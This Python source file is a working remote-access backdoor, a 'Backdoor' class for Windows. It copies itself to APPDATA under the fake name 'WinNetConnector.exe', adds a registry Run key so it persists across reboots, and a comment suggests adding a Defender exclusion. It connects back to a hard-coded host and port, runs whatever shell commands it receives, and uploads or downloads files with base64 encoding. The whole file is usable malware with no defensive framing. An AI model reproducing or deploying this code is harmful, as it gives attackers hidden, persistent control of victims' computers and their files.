import socket
import subprocess
import json
import os
import base64
import shutil
import sys


class Backdoor:
    def __init__(self, ip, port):
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def become_persistent(self):
        file_loc = os.environ["appdata"] + "\\WinNetConnector.exe" #composing path for another copy of exploit

        if not os.path.exists(file_loc): #if exploit hasn't been copied to file_loc path earlier
            shutil.copyfile(sys.executable, file_loc) #copy exe file to different location with other fake name; add path to WinDef exclusions before this
            subprocess.run( #add registry record to autorun our exploit with every OS start; initial exploit could be deleted
                f'reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v WinNetConnect /t REG_SZ /d "{file_loc}"', shell=True)

    def exec_command(self, command):
        try:
            return subprocess.check_output(command, shell=True, universal_newlines=True, stdin=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except subprocess.CalledProcessError:
            return False

    def listen(self):
        command = bytearray()
        while True:
            try:
                command.extend(self.connection.recv(1024))
                decoded = command.decode()
                final_com = json.loads(decoded)
                break
            except ValueError:
                continue
        return final_com

    def recv_file(self, file_path):
        content = bytearray()
        while True:
            try:
                content.extend(self.connection.recv(1024))
                json_content = content.decode(encoding="utf-8")
                # if file is not whole, then we can't load it in json and ValueError happens
                b64_string_content = json.loads(json_content)

                # if file downloading is finished
                b64_bytes_content = b64_string_content.encode(encoding="utf-8")
                bytes_content = base64.b64decode(b64_bytes_content)
                # save file
                return self.save_file(file_path.split(
                    "\\")[-1], bytes_content)

            except ValueError:
                # keep downloading content
                continue

    def save_file(self, path, content):
        try:
            with open(path, 'wb') as file:
                file.write(content)
                return b"Successful upload."
        except Exception:
            return False

    def read_file(self, path):
        try:
            with open(path, 'rb') as file:
                return base64.b64encode(file.read())
        except Exception:
            return False

    def send_b64(self, content):
        b64_string = content.decode(encoding='utf-8')
        content = json.dumps(b64_string)
        self.connection.send(content.encode(encoding='utf-8'))

    def change_directory(self, path):
        try:
            os.chdir(path)
        except FileNotFoundError:
            return False
        else:
            return f"Changing directory to {path}"

    def run(self):
        while True:
            try:
                command = self.listen()
                if command[0] == "quit" and len(command) == 1:
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_res = self.change_directory(command[1])
                elif command[0] == "download" and len(command) > 1:
                    file = self.read_file(command[1])
                    if file is False:
                        error_msg = b'Download error.'
                        self.send_b64(base64.b64encode(error_msg))
                    else:
                        self.send_b64(file)
                    continue
                elif command[0] == "upload" and len(command) > 1:
                    # here we listen for bytes, then try to write and save these bytes as a file
                    result = self.recv_file(command[1])
                    if result is False:  # if saving file results in error, send error message to the host
                        error_msg = b'Upload error'
                        self.send_b64(base64.b64encode(error_msg))
                    else:  # if no error, send the info about it to the host
                        self.send_b64(base64.b64encode(result))
                    continue
                else:
                    command_res = self.exec_command(command)

                if command_res is False:
                    error_msg = b'Error in executing command.'
                    self.send_b64(base64.b64encode(error_msg))
                    continue
                else:
                    command_res = base64.b64encode(
                        command_res.encode(encoding='utf-8'))
                    self.send_b64(command_res)
            except KeyboardInterrupt:
                self.connection.close()
                sys.exit()


try:
    bd = Backdoor("192.168.0.102", 8080)
    bd.run()
except Exception:
    sys.exit()
